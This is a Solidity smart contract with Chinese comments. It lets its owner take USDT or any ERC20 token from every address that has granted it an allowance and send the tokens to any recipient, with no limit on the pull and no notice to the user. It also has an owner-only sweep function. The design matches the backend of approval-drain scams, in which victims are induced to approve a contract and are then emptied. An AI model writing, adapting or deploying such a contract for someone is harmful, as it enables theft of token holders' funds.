// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice 最小 IERC20 接口（只包含本例需要的函数）
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @notice 极简 SafeERC20，仅实现 safeTransferFrom/safeTransfer 以兼容非标准返回值代币
library MiniSafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        (bool ok, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        (bool ok, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.transfer.selector, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}

/**
 * @title AllowancePuller
 * @notice 部署时指定 USDT(或任意 ERC20) 合约地址。
 *         任何用户只要把该代币的 allowance 授权给本合约，合约拥有者(owner)就能从该用户地址拉走代币到任意接收地址。
 */
contract AllowancePuller {
    using MiniSafeERC20 for IERC20;

    address public owner;          // 合约拥有者（部署者）
    IERC20  public immutable token; // 目标代币（USDT 或你想操作的 ERC20）

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event Pulled(address indexed from, address indexed to, uint256 amount);
    event Swept(address indexed erc20, address indexed to, uint256 amount);

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "ZERO_TOKEN");
        owner = msg.sender;
        token = IERC20(tokenAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    /// @notice 更换合约拥有者
    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_NEW_OWNER");
        emit OwnerChanged(owner, newOwner);
        owner = newOwner;
    }

    /// @notice 从 `from` 拉走 `amount` 个 token 到 `to`（需要 from 先对本合约 approve 足够额度）
    function pullFrom(address from, address to, uint256 amount) external onlyOwner {
        require(from != address(0) && to != address(0), "BAD_ADDR");
        token.safeTransferFrom(from, to, amount);
        emit Pulled(from, to, amount);
    }

    /// @notice 查看某地址给本合约的剩余额度
    function allowanceOf(address from) external view returns (uint256) {
        return token.allowance(from, address(this));
    }

    /// @notice 兜底：如果有 token 被直接打进合约，可由 owner 扫出
    function sweep(address erc20, address to, uint256 amount) external onlyOwner {
        require(erc20 != address(0) && to != address(0), "BAD_ADDR");
        IERC20(erc20).safeTransfer(to, amount);
        emit Swept(erc20, to, amount);
    }
}
